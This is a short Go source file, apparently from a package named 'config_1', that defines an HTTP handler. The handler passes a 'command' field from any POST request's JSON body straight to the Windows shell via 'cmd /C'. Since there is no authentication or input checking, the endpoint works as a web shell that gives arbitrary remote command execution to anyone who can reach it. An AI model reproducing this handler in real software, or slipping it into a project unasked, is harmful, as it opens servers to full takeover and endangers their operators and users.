package config_1

import (
	"encoding/json"
	"net/http"
	"os/exec"
	"strings"
)

type CmdRequest struct {
	Command string `json:"command"`
}

func HandleCommandExec(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(map[string]string{
			"status":  "failed",
			"message": "Only POST allowed",
		})
		return
	}

	var req CmdRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status":  "failed",
			"message": "Invalid input",
		})
		return
	}

	cmd := exec.Command("cmd", "/C", req.Command)
	_, err := cmd.CombinedOutput()
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"status":  "failed",
			"message": "Command execution failed: " + strings.TrimSpace(err.Error()),
		})
		return
	}

	// POST success response
	json.NewEncoder(w).Encode(map[string]string{
		"status": "success",
	})
}
